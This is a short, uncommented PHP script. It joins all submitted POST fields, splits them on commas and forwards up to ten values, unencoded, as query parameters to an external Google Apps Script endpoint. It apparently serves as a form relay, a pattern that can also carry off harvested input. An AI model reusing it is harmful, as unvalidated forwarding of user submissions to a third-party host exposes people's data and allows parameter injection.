<?php
$imp = implode("",$_POST);
$imp = explode(",",$imp);
$str = "/?1=$imp[0]";
for ($i=1;$i<10;$i++) {
  $pv = $i + 1;
  $str .= '&p'.$pv.'='.$imp[$i];
}
$url = 'https://script.google.com/macros/s/AKfycbw8sFc-jlQrlZJOf_8fvbnrO1KUjsrfwv376piCGXxV6PlV6j03/exec';
file_get_contents($url.$str);
